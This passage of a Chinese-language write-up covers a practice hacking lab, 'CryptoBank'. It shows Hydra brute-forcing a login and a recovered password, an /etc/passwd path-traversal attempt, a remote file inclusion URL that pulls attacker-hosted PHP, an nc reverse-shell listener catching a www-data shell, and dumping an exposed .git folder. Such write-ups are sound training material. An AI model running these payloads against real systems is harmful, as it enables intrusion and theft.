+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CryptoBank_1]<br>└─$ hydra -L usernames -P passwords 192.168.1.104 http-get /development<br>Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-18 02:16:02<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 216 login tries (l:18/p:12), ~14 tries per task<br>[DATA] attacking http-get://192.168.1.104:80/development<br>[80][http-get] host: 192.168.1.104   login: julius.b   password: wJWm4CgV26<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-18 02:16:04<br></code></pre></td></tr></table></figure>
+
+<p>之前的 <code>cheetsheet</code></p>
+<p><img src="/pic/dc6831d65be5ea1ff87450bfe5da16a5_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="登录认证后的目录爆破"><a href="#登录认证后的目录爆破" class="headerlink" title="登录认证后的目录爆破"></a>登录认证后的目录爆破</h2><p>登录后发现 <code>development</code> 界面只有 <code>only for development</code>。</p>
+<p><img src="/pic/66c83b921018cb46102c2320b10eaf04_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>不过却发现了 <code>Authorization</code> 字段</p>
+<p><img src="/pic/132d7e1a5f8eb95e26d0250d487835b3_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CryptoBank_1]<br>└─$ sudo dirsearch -u http://cryptobank.local/development/ -H <span class="hljs-string">&quot;Authorization: Basic anVsaXVzLmI6d0pXbTRDZ1YyNg==&quot;</span><br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>[02:21:24] Starting: <br><br>[02:21:28] 200 -  109B  - /development/.user.ini                            <br>[02:21:40] 301 -  334B  - /development/backups  -&gt;  http://cryptobank.local/development/backups/<br>[02:21:40] 200 -  973B  - /development/backups/                             <br>[02:21:48] 200 -   21B  - /development/index.html                           <br>[02:21:54] 200 -  109B  - /development/php.ini                              <br>[02:21:54] 200 -  109B  - /development/php5.ini                             <br>[02:22:02] 301 -  332B  - /development/tools  -&gt;  http://cryptobank.local/development/tools/<br>[02:22:02] 302 -    0B  - /development/tools/  -&gt;  /development/tools/homepage.html<br></code></pre></td></tr></table></figure>
+
+<p>依次查看各个文件 <code>.user.ini</code>，<code>php.ini</code>, <code>php5.ini</code> 中包含了一个防火墙的文件路径，backups 目录打开是 home 目录，再打开是网站首页，<code>tools</code> 目录中包含了一些看起来很有用的功能</p>
+<p><img src="/pic/0081b3fadb2174d8ad5e3e190fbb272f_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>运行系统命令似乎需要用户名和密码，之前的用户名和密码爆破失败。</p>
+<p><img src="/pic/4d01ede6d019305676cd0367a3f8c84c_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看系统文件的功能有 waf 无法直接使用文件包含漏洞</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>网页中给的例子的URL<br>http:<span class="hljs-regexp">//</span>cryptobank.local<span class="hljs-regexp">/development/</span>tools<span class="hljs-regexp">/FileInclusion/</span>pages/fetchmeafile.php?file=file.txt<br><br><span class="hljs-regexp">//</span>构造的URL<br>http:<span class="hljs-regexp">//</span>cryptobank.local<span class="hljs-regexp">/development/</span>tools<span class="hljs-regexp">/FileInclusion/</span>pages<span class="hljs-regexp">/fetchmeafile.php?file=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br></code></pre></td></tr></table></figure>
+
+<p>触发了WAF</p>
+<p><img src="/pic/6fe431d23fccd2d28befd3fba67555ca_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>上传文件的地方也有 WAF，无法上传 php 文件，截断也失败，图片马也会被查</p>
+<p>在这里卡了蛮久的，一直在想着绕 WAF</p>
+<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>或许可以试试远程文件包含？info.php 里可是暴露了此风险的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://cryptobank.local/development/tools/FileInclusion/pages/fetchmeafile.php?file=http://192.168.1.101:8088/x.php<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CryptoBank_1]<br>└─$ sudo nc -lvnp 1234<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 1234 ...<br>connect to [192.168.1.101] from (UNKNOWN) [192.168.1.104] 33228<br>Linux cryptobank 4.15.0-96-generic <span class="hljs-comment">#97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br> 07:39:09 up  2:52,  0 <span class="hljs-built_in">users</span>,  load average: 0.08, 0.12, 0.10<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br></code></pre></td></tr></table></figure>
+
+<p>反弹成功。</p>
+<h2 id="git-信息泄露"><a href="#git-信息泄露" class="headerlink" title=".git 信息泄露"></a>.git 信息泄露</h2><p>看 WP 才发现，这里还有一种思路，我们发现了 backups&#x2F;home 目录，也需要对此目录下的信息进行收集</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(kali㉿kali)-[~<span class="hljs-regexp">/Documents/</span>CryptoBank_1]<br>└─$ sudo dirsearch -u http:<span class="hljs-regexp">//</span>cryptobank.local<span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span> -H <span class="hljs-string">&quot;Authorization: Basic anVsaXVzLmI6d0pXbTRDZ1YyNg==&quot;</span><br><br>[<span class="hljs-number">02</span>:<span class="hljs-number">48</span>:<span class="hljs-number">47</span>] Starting: <br>[<span class="hljs-number">02</span>:<span class="hljs-number">48</span>:<span class="hljs-number">48</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">839</span>B  - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.git<span class="hljs-regexp">/branches/</span>         <br>[<span class="hljs-number">02</span>:<span class="hljs-number">48</span>:<span class="hljs-number">49</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">23</span>B  - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.git/HEAD              <br>[<span class="hljs-number">02</span>:<span class="hljs-number">48</span>:<span class="hljs-number">49</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">3</span>KB - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.git/                  <br>[<span class="hljs-number">02</span>:<span class="hljs-number">48</span>:<span class="hljs-number">49</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">157</span>B  - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.git/COMMIT_EDITMSG    <br>[<span class="hljs-number">02</span>:<span class="hljs-number">48</span>:<span class="hljs-number">49</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">73</span>B  - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.git/description<br>[<span class="hljs-number">02</span>:<span class="hljs-number">48</span>:<span class="hljs-number">49</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">344</span>B  - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.git  -&gt;  http:<span class="hljs-regexp">//</span>cryptobank.local<span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.git/<br>[<span class="hljs-number">02</span>:<span class="hljs-number">48</span>:<span class="hljs-number">49</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">153</span>B  - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.git/config<br>[<span class="hljs-number">02</span>:<span class="hljs-number">48</span>:<span class="hljs-number">49</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">240</span>B  - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.git<span class="hljs-regexp">/info/</span>exclude      <br>[<span class="hljs-number">02</span>:<span class="hljs-number">48</span>:<span class="hljs-number">49</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">3</span>KB - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.git<span class="hljs-regexp">/hooks/</span>            <br>[<span class="hljs-number">02</span>:<span class="hljs-number">48</span>:<span class="hljs-number">49</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">178</span>B  - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.git<span class="hljs-regexp">/logs/</span>refs<span class="hljs-regexp">/heads/m</span>aster<br>[<span class="hljs-number">02</span>:<span class="hljs-number">48</span>:<span class="hljs-number">49</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">178</span>B  - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.git<span class="hljs-regexp">/logs/</span>HEAD<br>[<span class="hljs-number">02</span>:<span class="hljs-number">48</span>:<span class="hljs-number">49</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">1</span>KB - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.git<span class="hljs-regexp">/info/</span><br>[<span class="hljs-number">02</span>:<span class="hljs-number">48</span>:<span class="hljs-number">49</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">1</span>KB - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.git<span class="hljs-regexp">/logs/</span><br>[<span class="hljs-number">02</span>:<span class="hljs-number">48</span>:<span class="hljs-number">49</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">360</span>B  - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.git<span class="hljs-regexp">/logs/</span>refs<span class="hljs-regexp">/heads  -&gt;  http:/</span><span class="hljs-regexp">/cryptobank.local/</span>development<span class="hljs-regexp">/backups/</span>home<span class="hljs-regexp">/.git/</span>logs<span class="hljs-regexp">/refs/</span>heads/<br>[<span class="hljs-number">02</span>:<span class="hljs-number">48</span>:<span class="hljs-number">49</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">354</span>B  - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.git<span class="hljs-regexp">/logs/</span>refs  -&gt;  http:<span class="hljs-regexp">//</span>cryptobank.local<span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.git<span class="hljs-regexp">/logs/</span>refs/<br>[<span class="hljs-number">02</span>:<span class="hljs-number">48</span>:<span class="hljs-number">49</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">355</span>B  - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.git<span class="hljs-regexp">/refs/</span>heads  -&gt;  http:<span class="hljs-regexp">//</span>cryptobank.local<span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.git<span class="hljs-regexp">/refs/</span>heads/<br>[<span class="hljs-number">02</span>:<span class="hljs-number">48</span>:<span class="hljs-number">49</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">354</span>B  - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.git<span class="hljs-regexp">/refs/</span>tags  -&gt;  http:<span class="hljs-regexp">//</span>cryptobank.local<span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.git<span class="hljs-regexp">/refs/</span>tags/<br>[<span class="hljs-number">02</span>:<span class="hljs-number">48</span>:<span class="hljs-number">49</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">66</span>B  - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.gitattributes<br>[<span class="hljs-number">02</span>:<span class="hljs-number">48</span>:<span class="hljs-number">49</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">1</span>KB - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.git<span class="hljs-regexp">/refs/</span>             <br>[<span class="hljs-number">02</span>:<span class="hljs-number">48</span>:<span class="hljs-number">49</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">28</span>KB - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.git<span class="hljs-regexp">/objects/</span>          <br>[<span class="hljs-number">02</span>:<span class="hljs-number">48</span>:<span class="hljs-number">49</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">41</span>B  - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.git<span class="hljs-regexp">/refs/</span>heads/master<br>[<span class="hljs-number">02</span>:<span class="hljs-number">48</span>:<span class="hljs-number">49</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">21</span>KB - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.git/index             <br>[<span class="hljs-number">02</span>:<span class="hljs-number">48</span>:<span class="hljs-number">49</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">12</span>B  - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>.htaccess              <br>[<span class="hljs-number">02</span>:<span class="hljs-number">49</span>:<span class="hljs-number">05</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">2</span>KB - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>assets/                 <br>[<span class="hljs-number">02</span>:<span class="hljs-number">49</span>:<span class="hljs-number">05</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">346</span>B  - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>assets  -&gt;  http:<span class="hljs-regexp">//</span>cryptobank.local<span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>assets/<br>[<span class="hljs-number">02</span>:<span class="hljs-number">49</span>:<span class="hljs-number">11</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">1</span>KB - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/</span>development/            <br>[<span class="hljs-number">02</span>:<span class="hljs-number">49</span>:<span class="hljs-number">16</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">33</span>KB - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/i</span>ndex.html              <br>[<span class="hljs-number">02</span>:<span class="hljs-number">49</span>:<span class="hljs-number">16</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">447</span>KB - <span class="hljs-regexp">/development/</span>backups<span class="hljs-regexp">/home/i</span>ndex.js    <br>Task Completed<br></code></pre></td></tr></table></figure>
+
+<p>下载文件到本地</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/tools/GitTools/Dumper]<br>└─$ ./gitdumper.sh http://cryptobank.local/development/backups/home/.git/ ~/Documents/CryptoBank_1/home <br></code></pre></td></tr></table></figure>
+
+<p>从中提取文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/tools/GitTools/Extractor]<br>└─$ ./extractor.sh ~/Documents/CryptoBank_1/clone ~/Documents/CryptoBank_1/gitfile <br></code></pre></td></tr></table></figure>
+
+<p>查看文件目录结构</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CryptoBank_1/gitfile]<br>└─$ tree                      <br>.<br>└── 0-bd768251b7225e88ae11225d60645a0d5f2106f0<br>    ├── assets<br>    │   ├── css<br>    │   │   ├── animate.min.css<br>    │   │   ├── animation.css<br>    │   │   ├── bootstrap.min.css<br>    │   │   ├── font-awesome.min.css<br>    │   │   ├── material-design-iconic-font.min.css<br>    │   │   ├── owl.carousel.min.css<br>    │   │   ├── responsive.css<br>    │   │   └── slicknav.min.css<br>    │   ├── fonts<br>    │   │   ├── FontAwesome.otf<br>    │   │   ├── fontawesome-webfont.eot<br>    │   │   ├── fontawesome-webfont.svg<br>    │   │   ├── fontawesome-webfont.ttf<br>    │   │   ├── fontawesome-webfont.woff<br>    │   │   ├── fontawesome-webfont.woff2<br>    │   │   ├── Material-Design-Iconic-Font.eot<br>    │   │   ├── Material-Design-Iconic-Font.svg<br>    │   │   ├── Material-Design-Iconic-Font.ttf<br>    │   │   ├── Material-Design-Iconic-Font.woff<br>    │   │   └── Material-Design-Iconic-Font.woff2<br>    │   ├── img<br>    │   │   ├── about-bg.png<br>    │   │   ├── about-icon-1.png<br>    │   │   ├── about-icon-2.png<br>    │   │   ├── about-icon-3.png<br>    │   │   ├── about-left.png<br>    │   │   ├── about-shap.jpg<br>    │   │   ├── bg.png<br>    │   │   ├── blog-3.jpg<br>    │   │   ├── blog-blog-1.jpg<br>    │   │   ├── blog-blog-2.jpg<br>    │   │   ├── blog-blog-3.jpg<br>    │   │   ├── blog-blog-4.jpg<br>    │   │   ├── blog-blog-5.jpg<br>    │   │   ├── blog-blog-6.jpg<br>    │   │   ├── blog-blog-7.jpg<br>    │   │   ├── blog-blog-8.jpg<br>    │   │   ├── carousel-2.jpg<br>    │   │   ├── c-logo-1.png<br>    │   │   ├── c-logo-2.png<br>    │   │   ├── c-logo-3.png<br>    │   │   ├── c-logo-4.png<br>    │   │   ├── c-logo-5.png<br>    │   │   ├── documentaion-bg.png<br>    │   │   ├── fabicon.png<br>    │   │   ├── flag-1.png<br>    │   │   ├── flag-2.png<br>    │   │   ├── flag-3.png<br>    │   │   ├── flag-4.png<br>    │   │   ├── flag-5.png<br>    │   │   ├── Group1.png<br>    │   │   ├── initial-bg.png<br>    │   │   ├── liveShape-bg.svg<br>    │   │   ├── logo-c-bottom-bg.png<br>    │   │   ├── logo-top.png<br>    │   │   ├── Mobile.png<br>    │   │   ├── roadmap-1.png<br>    │   │   ├── roadmap-2.png<br>    │   │   ├── roadmap-4.png<br>    │   │   ├── roadmap-5.png<br>    │   │   ├── superman-1.jpg<br>    │   │   ├── superman-2.jpg<br>    │   │   ├── superman-3.jpg<br>    │   │   ├── superman-4.jpg<br>    │   │   ├── superman-5.jpg<br>    │   │   ├── superman-6.jpg<br>    │   │   ├── superman-7.jpg<br>    │   │   ├── superman-8.jpg<br>    │   │   ├── token-bottom.png<br>    │   │   ├── token-top.png<br>    │   │   ├── welcome-imgOLD.png<br>    │   │   └── welcome-img.png<br>    │   ├── js<br>    │   │   ├── bootstrap.min.js<br>    │   │   ├── jquery-2.2.4.min.js<br>    │   │   ├── jquery.slicknav.min.js<br>    │   │   ├── main.js<br>    │   │   ├── owl.carousel.min.js<br>    │   │   ├── particles.min.js<br>    │   │   ├── popper.js<br>    │   │   ├── skrollr.min.js<br>    │   │   └── wow.min.js<br>    │   └── logo-top-dark.png<br>    ├── closed.html<br>    ├── commit-meta.txt<br>    ├── development<br>    │   ├── php.ini<br>    │   └── tools<br>    │       ├── CommandExecution<br>    │       │   ├── commandexec.html<br>    │       │   └── CommandExec.php<br>    │       ├── FileInclusion<br>    │       │   └── pages<br>    │       │       ├── fetchmeafile.php<br>    │       │       ├── fileinc.html<br>    │       │       └── file.txt<br>    │       ├── FileUpload<br>    │       │   ├── fileupl.html<br>    │       │   └── fileupload.php<br>    │       ├── homepage.html<br>    │       ├── index.php<br>    │       └── Resources<br>    │           └── button.css<br>    ├── dev-notes.txt<br>    ├── index.html<br>    ├── index.js<br>    ├── ninjacheck.php<br>    ├── ninjafirewall<br>    │   ├── changelog.php<br>    │   ├── conf<br>    │   │   ├── index.html<br>    │   │   ├── options.php<br>    │   │   └── rules.php<br>    │   ├── firewall.php<br>    │   ├── fonts<br>    │   │   ├── glyphicons-halflings-regular.eot<br>    │   │   ├── glyphicons-halflings-regular.svg<br>    │   │   ├── glyphicons-halflings-regular.ttf<br>    │   │   ├── glyphicons-halflings-regular.woff<br>    │   │   ├── glyphicons-halflings-regular.woff2<br>    │   │   └── index.html<br>    │   ├── index.php<br>    │   ├── install.php<br>    │   ├── INSTALL.TXT<br>    │   ├── lib<br>    │   │   ├── account_license.php<br>    │   │   ├── account_options.php<br>    │   │   ├── account_updates.php<br>    │   │   ├── constants.php<br>    │   │   ├── firewall_access_control.php<br>    │   │   ├── firewall_centlog.php<br>    │   │   ├── firewall_filecheck.php<br>    │   │   ├── firewall_fileguard.php<br>    │   │   ├── firewall_livelog.php<br>    │   │   ├── firewall_log.php<br>    │   │   ├── firewall_options.php<br>    │   │   ├── firewall_policies.php<br>    │   │   ├── firewall_rules_editor.php<br>    │   │   ├── firewall_webfilter.php<br>    │   │   ├── fw_centlog.php<br>    │   │   ├── help.php<br>    │   │   ├── i18n_js.php<br>    │   │   ├── index.html<br>    │   │   ├── locale.php<br>    │   │   ├── misc.php<br>    │   │   ├── nfw_init.php<br>    │   │   ├── share<br>    │   │   │   ├── index.html<br>    │   │   │   └── iso3166.csv<br>    │   │   ├── summary_overview.php<br>    │   │   ├── summary_stats.php<br>    │   │   └── utils_ui.php<br>    │   ├── license.txt<br>    │   ├── locale<br>    │   │   ├── fr_FR<br>    │   │   │   ├── index.html<br>    │   │   │   └── LC_MESSAGES<br>    │   │   │       ├── index.html<br>    │   │   │       ├── ninjafirewall_pro-fr_FR.mo<br>    │   │   │       └── ninjafirewall_pro-fr_FR.po<br>    │   │   ├── index.html<br>    │   │   └── ninjafirewall_pro.pot<br>    │   ├── login.php<br>    │   ├── nfwlog<br>    │   │   ├── admin.php<br>    │   │   ├── cache<br>    │   │   │   ├── garbage_collector.php<br>    │   │   │   ├── index.html<br>    │   │   │   └── ip_bk_flushed.php<br>    │   │   ├── firewall_2020-04.php<br>    │   │   └── index.html<br>    │   ├── pro2-reset-is-now-hidden.php<br>    │   └── static<br>    │       ├── bootstrap.min.css<br>    │       ├── bootstrap.min.js<br>    │       ├── favicon.ico<br>    │       ├── index.html<br>    │       ├── jquery.js<br>    │       ├── logo_200.png<br>    │       ├── logo_45.png<br>    │       ├── ninjafirewall.js<br>    │       ├── styles.css<br>    │       ├── twitter.png<br>    │       └── vendor<br>    │           ├── Chart.min.js<br>    │           └── index.html<br>    ├── style.css<br>    └── trade<br>        ├── applying_loan.php<br>        ├── balance_checking.php<br>        ├── bootstrap_3.3.7<br>        │   ├── css<br>        │   │   ├── bootstrap.css<br>        │   │   ├── bootstrap.css.map<br>        │   │   ├── 